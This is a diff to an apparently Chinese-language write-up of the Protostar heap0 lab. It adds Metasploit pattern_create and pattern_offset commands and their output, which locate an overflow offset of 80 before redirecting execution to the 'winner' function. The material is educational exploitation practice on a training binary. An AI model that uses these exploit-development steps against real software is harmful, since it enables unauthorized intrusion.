@@ -66,6 +66,13 @@ int main(int argc, char **argv)
 
 ---
 **首先确定偏移量为80**
+
+```c
+└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+```
+
 ```c
 └─$ gdb heap0
 GNU gdb (Debian 16.3-1) 16.3
@@ -94,6 +101,12 @@ data is at 0x804a1a0, fp is at 0x804a1f0
 Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
 
+```
+
+```c
+┌──(kali㉿kali)-[/opt/protostar/bin]
+└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37634136  -l 100
+[*] Exact match at offset 80
 ```
 
 **获取winner 的地址为0x08048464**
